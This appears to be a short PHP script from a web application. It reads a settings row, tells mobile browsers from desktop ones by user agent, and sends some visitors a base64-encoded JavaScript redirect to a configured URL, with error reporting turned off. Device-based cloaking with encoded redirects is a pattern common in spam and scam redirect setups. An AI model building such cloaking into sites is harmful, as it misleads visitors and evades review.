<?php
error_reporting(0); 
include("conn.php");
include("common.php");
$type="WHERE id='1'";
$wz=queryall(peizhi,$type);
if($wz[gb]==0){
$content2 ="<script>location.href='$wz[pcurl]'</script>";
$daima2=base64_encode($content2);
echo $daima2;
exit;
}
$agent = $_SERVER['HTTP_USER_AGENT'];
if(strpos($agent,"NetFront") || strpos($agent,"iPhone") || strpos($agent,"MIDP-2.0") || strpos($agent,"Opera Mini") || strpos($agent,"UCWEB") || strpos($agent,"Android") || strpos($agent,"Windows CE") || 
strpos($agent,"SymbianOS")){ 
}else{
if($wz[pc]==0){
$content2 ="<script>location.href='$wz[pcurl]'</script>";
$daima2=base64_encode($content2);
echo $daima2;
exit;
}
}